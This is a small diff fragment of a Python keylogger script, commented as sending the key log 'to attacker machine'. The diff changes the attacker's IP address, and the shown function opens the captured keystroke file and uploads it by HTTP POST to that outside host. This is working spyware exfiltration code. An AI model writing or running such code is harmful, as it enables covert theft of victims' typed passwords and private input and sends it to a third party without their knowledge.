@@ -10,7 +10,7 @@ log_path = os.path.join(script_dir, "keylog.txt")
 
 # sends key log to attacker machine
 def send_log():
-    url = "http://192.168.86.50:8000"
+    url = "http://172.16.23.132:8000"
     files = {'file': open(log_path, 'rb')}
     try:
         requests.post(url, files=files)
